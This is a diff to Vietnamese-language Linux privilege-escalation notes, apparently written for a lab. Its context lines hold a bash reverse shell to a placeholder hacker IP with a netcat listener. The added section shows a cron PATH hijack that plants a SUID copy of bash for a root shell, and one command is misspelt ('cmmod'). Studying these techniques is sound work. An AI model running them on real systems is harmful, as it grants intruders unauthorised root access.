@@ -16,3 +16,23 @@
       #!/bin/bash
       bash -i >& /dev/tcp/<hacker_ip>/<hacker_port> 0>&1
 - Setup một netcat listener trên máy hacker trùng với ```<hacker_port``` và đợi nó hoạt động. Root shell sẽ xuất hiện sau đó
+
+# PATH Environment Variable
+- Check crontab:
+
+      cat /etc/crontab
+- Để ý PATH bắt đầu bằng /home/user (home dir của user). Tạo một file ```overwrite.sh``` ở home dir với nội dung
+
+      #!/bin/bash
+      cp /bin/bash /tmp/rootbash
+      chmod +xs /tmp/rootbash
+- Đảm bảo rằng file có thể thực thi
+ 
+      cmmod +x /home/user/overwrite.sh
+- Đợi cron job chạy. Chạy ```/tmp/rootbash``` command với ```-p``` để lấy root shell
+
+      /tmp/rootbash -p
+- Nhớ xoá /tmp/rootbash sau khi hoàn thành
+
+      rm /tmp/rootbash
+      exit
